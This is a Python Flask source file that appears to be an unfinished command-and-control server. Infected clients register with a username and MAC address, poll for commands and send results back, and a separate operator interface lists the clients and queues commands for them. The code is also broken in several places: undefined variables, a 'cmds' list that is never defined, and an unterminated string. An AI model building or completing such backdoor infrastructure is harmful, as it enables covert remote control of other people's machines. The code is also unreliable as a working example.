#!/usr/bin/python3

from flask import Flask, jsonify, request
from uuid import uuid4
import os, time

app = Flask("listener")
client = Flask("client")
clients = {}
cmd_queue = {}

def all_cmds():
	pass
	# make/change structure

def gen_user_id(user, mac):
	user_id = ''
	i = 0
	while not i == 4:
		user_id += list(user)[i]
		i += 1
	for i in range(0,5):
		user_id += list(''.join(mac.split(":")))[-i]
	return user_id

@app.route("/register",methods=['GET'])
def register_client():
	data = request.args
	user = data['user']
	mac = data['mac']
	user_id = gen_user_id(user, mac)
	clients[user_id] = {'user':user,'mac':mac,'cmds':{}}
	return user_id, 200

@app.route("/rejoin",methods=['GET'])
def old_client():
	data = request.args
	user = data['user']
	mac = data['mac']
	uid = data['user-id']
	clients[user_id] = {'user':user,'mac':mac,cmds:{}}
	return uid, 200


@app.route("/cmd",methods=['GET'])
def get_cmd():
	if 'data' in request.args:
		uid = request.args['user-id']
		data = request.args['data']
		cid = request.args['cmd-id']
		clients[uid][cmds][cid] = data
	uid = request.args['uid']
	for i in cmds:
		if not i['user-id'] == uid:
			continue
		cid = str(uuid4())
		cmd = i['cmd']
		res = {
			'cmd-id':cid,
			'cmd':cmd,
		}
		return jsonify(res), 200
	return "jsonify({'cmd':None}), 200

@client.route("/clients",methods=['GET'])
def c_clients():
	return jsonify({'clients':clients}), 200

@client.route("/cmd/new",methods=['GET'])
def c_newcmd():
	data = request.args
	uid = data['user-id']
	cmd = data['cmd']
	cmds.append({'user-id':uid,'cmd':cmd})
	return "", 200
